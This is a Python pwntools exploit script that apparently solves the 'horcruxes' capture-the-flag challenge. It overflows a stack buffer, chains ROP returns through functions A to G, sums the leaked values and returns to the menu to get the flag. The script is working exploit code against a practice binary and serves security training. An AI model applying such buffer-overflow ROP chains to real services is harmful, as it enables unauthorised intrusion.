#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template horcruxes
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'horcruxes')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.HOST and args.PORT:
        return remote(args.HOST, args.PORT, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:      Full RELRO
# Stack:      No canary found
# NX:         NX enabled
# PIE:        No PIE (0x8040000)
# Stripped:   No

io = start()

log.info("""pretty simple rop - seccomp and no memory leak gets in the way a little bit, because we smash ebx
and break plt calls during the attack. we'll just loop through all of the horcruxes, calculate the sum (usually correctly lol)
then rop back into main and send the sum to print the flag""")

log.info("ropping through the horcuxes...")
io.sendline(b'0')
io.sendline(cyclic(120) +
            p32(exe.symbols['A']) +
            p32(exe.symbols['B']) +
            p32(exe.symbols['C']) +
            p32(exe.symbols['D']) +
            p32(exe.symbols['E']) +
            p32(exe.symbols['F']) +
            p32(exe.symbols['G']) +
            p32(exe.symbols['ropme'])
    )

sum = 0

for _ in range(7):
    sum += int(io.recvregex(rb".*\(EXP \+(-?\d*)\)", capture=True).group(1).decode('latin1'))
    sum &= 0xFFFFFFFF

log.info(f"sum = {sum} (usually lol)")

io.readuntil(b"Select Menu:")
io.sendline(b"0")
io.sendline(b"%d" % sum)
io.interactive()

